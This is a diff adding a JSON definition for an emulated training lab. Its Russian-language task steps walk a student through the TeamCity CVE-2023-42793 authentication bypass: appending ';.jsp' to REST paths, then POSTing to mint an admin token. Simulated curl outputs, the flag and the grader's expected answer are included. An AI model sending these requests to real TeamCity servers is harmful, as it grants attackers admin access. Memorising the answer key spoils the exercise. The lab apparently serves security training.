@@ -1,0 +1,47 @@
+{
+  "id": "web-teamcity",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{t34mc1ty_4uth_byp4ss_t0_rce}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: TeamCity CVE-2023-42793\n\nЦель: `http://teamcity.local:8111`.\n\n1. Версия:\n   curl -s http://teamcity.local:8111/app/rest/server\n\n2. Убедись, что эндпоинт закрыт (ждём 401):\n   curl -s -o /dev/null -w '%{http_code}\\n' http://teamcity.local:8111/app/rest/users/id:1\n\n3. Обойди аутентификацию через `;.jsp`:\n   curl -s -o /dev/null -w '%{http_code}\\n' 'http://teamcity.local:8111/app/rest/users/id:1;.jsp'\n\n4. Создай токен админа и выполни команду:\n   curl -s -X POST 'http://teamcity.local:8111/app/rest/users/id:1/tokens/x;.jsp'\n\n5. В ответе — токен и флаг. Сохрани флаг в found.txt и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция teamcity.local)",
+      "cases": [
+        {
+          "match": "tokens/",
+          "example": "-s -X POST 'http://teamcity.local:8111/app/rest/users/id:1/tokens/x;.jsp'",
+          "output": "{\"name\":\"x\",\"value\":\"eyJ0eXAiOiAiSldUIi...nto{t34mc1ty_4uth_byp4ss_t0_rce}\"}\n"
+        },
+        {
+          "match": "users/id:1;\\.jsp|id:1;\\.jsp",
+          "example": "-s -o /dev/null -w '%{http_code}' 'http://teamcity.local:8111/app/rest/users/id:1;.jsp'",
+          "output": "200\n"
+        },
+        {
+          "match": "users/id:1",
+          "example": "-s -o /dev/null -w '%{http_code}' http://teamcity.local:8111/app/rest/users/id:1",
+          "output": "401\n"
+        },
+        {
+          "match": "app/rest/server",
+          "example": "-s http://teamcity.local:8111/app/rest/server",
+          "output": "<server version=\"2023.05.3\" versionMajor=\"2023\" versionMinor=\"05\"/>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только teamcity.local"
+    }
+  }
+}
